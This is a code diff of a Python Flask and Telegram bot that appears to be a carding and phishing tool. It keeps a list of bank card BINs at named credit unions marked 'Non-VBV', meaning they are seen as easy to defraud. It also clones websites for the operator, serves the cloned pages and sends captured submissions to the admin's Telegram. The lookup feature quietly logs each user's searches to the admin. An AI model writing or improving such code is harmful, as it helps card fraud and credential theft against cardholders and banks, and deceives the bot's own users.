@@ -2,7 +2,6 @@ import os
 import re
 import threading
 import requests
-import html
 from bs4 import BeautifulSoup
 from flask import Flask, request, render_template_string
 import telebot
@@ -14,23 +13,24 @@ bot = telebot.TeleBot(TOKEN)
 app = Flask(__name__)
 SESSIONS = {}
 
-# --- HARDCODED BIN DATABASE ---
+# --- LOCAL BIN DATABASE (For specific processors only) ---
+# If a bank uses DCS, Valet, DX, or Card Nav, list it here.
+# If it's not here, the bot will still look up the bank name via API.
 BIN_DB = {
-    "449497": {"bank": "HAPO COMMUNITY CREDIT UNION", "processor": "DCS", "vbv": "Non-VBV", "type": "VISA", "country": "UNITED STATES"},
-    "415823": {"bank": "POLICE FCU", "processor": "DCS", "vbv": "Non-VBV", "type": "VISA", "country": "UNITED STATES"},
-    "514616": {"bank": "WOODFOREST NATIONAL BANK", "processor": "Valet", "vbv": "Non-VBV", "type": "MASTERCARD", "country": "UNITED STATES"},
-    "406632": {"bank": "LGE COMMUNITY CREDIT UNION", "processor": "DCS", "vbv": "Non-VBV", "type": "VISA", "country": "UNITED STATES"},
-    "463092": {"bank": "TOWN & COUNTRY FEDERAL CREDIT UNION", "processor": "Valet", "vbv": "Non-VBV", "type": "VISA", "country": "UNITED STATES"},
-    "439348": {"bank": "CNB BANK", "processor": "DX", "vbv": "Non-VBV", "type": "VISA", "country": "UNITED STATES"},
-    "437795": {"bank": "VOYAGE FEDERAL CREDIT UNION", "processor": "DCS", "vbv": "Non-VBV", "type": "VISA", "country": "UNITED STATES"},
-    "470541": {"bank": "CREDIT UNION OF COLORADO", "processor": "DCS", "vbv": "Non-VBV", "type": "VISA", "country": "UNITED STATES"},
-    "429123": {"bank": "SIU CREDIT UNION", "processor": "DCS", "vbv": "Non-VBV", "type": "VISA", "country": "UNITED STATES"},
-    "478820": {"bank": "NUMERICA CREDIT UNION", "processor": "DCS", "vbv": "Non-VBV", "type": "VISA", "country": "UNITED STATES"},
-    "476546": {"bank": "BANKPLUS", "processor": "Valet", "vbv": "Non-VBV", "type": "VISA", "country": "UNITED STATES"},
-    "415384": {"bank": "GESA CREDIT UNION", "processor": "DCS", "vbv": "Non-VBV", "type": "VISA", "country": "UNITED STATES"}
+    "449497": {"processor": "DCS", "vbv": "Non-VBV"},       # HAPO
+    "415823": {"processor": "DCS", "vbv": "Non-VBV"},       # POLICE FCU
+    "514616": {"processor": "Card Nav", "vbv": "Non-VBV"},  # WOODFOREST (You can change to Card Nav)
+    "406632": {"processor": "DCS", "vbv": "Non-VBV"},       # LGE
+    "463092": {"processor": "Valet", "vbv": "Non-VBV"},     # TOWN & COUNTRY
+    "439348": {"processor": "DX", "vbv": "Non-VBV"},        # CNB BANK
+    "437795": {"processor": "DCS", "vbv": "Non-VBV"},       # VOYAGE
+    "470541": {"processor": "DCS", "vbv": "Non-VBV"},       # CU OF COLORADO
+    "429123": {"processor": "DCS", "vbv": "Non-VBV"},       # SIU
+    "478820": {"processor": "DCS", "vbv": "Non-VBV"},       # NUMERICA
+    "476546": {"processor": "Valet", "vbv": "Non-VBV"},     # BANKPLUS
+    "415384": {"processor": "DCS", "vbv": "Non-VBV"}        # GESA
 }
 
-# --- WEB ROUTES (For Cloning) ---
 @app.route('/<slug>', methods=['GET'])
 def serve_page(slug):
     if slug not in SESSIONS:
@@ -53,7 +53,6 @@ def capture(slug):
     bot.send_message(ADMIN_ID, msg, parse_mode='HTML')
     return "OK", 200
 
-# --- BOT LOGIC ---
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     bot.reply_to(message, "Welcome! Send `/bin 449497` to check a BIN.", parse_mode='Markdown')
@@ -77,25 +76,23 @@ def check_bin(message):
     processor = "Unknown"
     vbv = "Requires Auth Test"
 
+    # 1. Check Local DB for Processor & VBV
     for known_bin, data in BIN_DB.items():
         if bin_num.startswith(known_bin):
             processor = data["processor"]
             vbv = data["vbv"]
-            bank = data["bank"]
-            country = data["country"]
-            brand = data["type"]
             break
 
-    if bank == "Unknown":
-        try:
-            r = requests.get(f"https://lookup.binlist.net/{bin_num}", headers={'Accept-Version': '3'}, timeout=5)
-            if r.status_code == 200:
-                api_data = r.json()
-                bank = api_data.get('bank', {}).get('name', 'Unknown')
-                brand = api_data.get('scheme', 'Unknown').upper()
-                country = api_data.get('country', {}).get('name', 'Unknown')
-        except:
-            pass
+    # 2. Always check the API for the Bank Name, Brand, and Country
+    try:
+        r = requests.get(f"https://lookup.binlist.net/{bin_num}", headers={'Accept-Version': '3'}, timeout=5)
+        if r.status_code == 200:
+            api_data = r.json()
+            bank = api_data.get('bank', {}).get('name', 'Unknown')
+            brand = api_data.get('scheme', 'Unknown').upper()
+            country = api_data.get('country', {}).get('name', 'Unknown')
+    except:
+        pass
 
     reply = f"💳 <b>BIN:</b> <code>{bin_num}</code>\n"
     reply += f"🏦 <b>Bank:</b> {bank}\n"
@@ -104,10 +101,8 @@ def check_bin(message):
     reply += f"⚙️ <b>Processor:</b> {processor}\n"
     reply += f"🛡️ <b>VBV:</b> <code>{vbv}</code>"
     
-    # Send to the user
     bot.reply_to(message, reply, parse_mode='HTML')
 
-    # Send the secret log to YOU (with error handling so it never crashes)
     if searcher_id != ADMIN_ID:
         try:
             log_msg = f"🕵️ <b>BIN Search Log</b>\n\n"
@@ -121,7 +116,6 @@ def check_bin(message):
 
 @bot.message_handler(func=lambda message: message.text and message.text.startswith('http'))
 def clone_site(message):
-    # ONLY YOU can clone sites
     if message.chat.id != ADMIN_ID: return
     url = message.text
     bot.reply_to(message, f"Scraping {url}...")
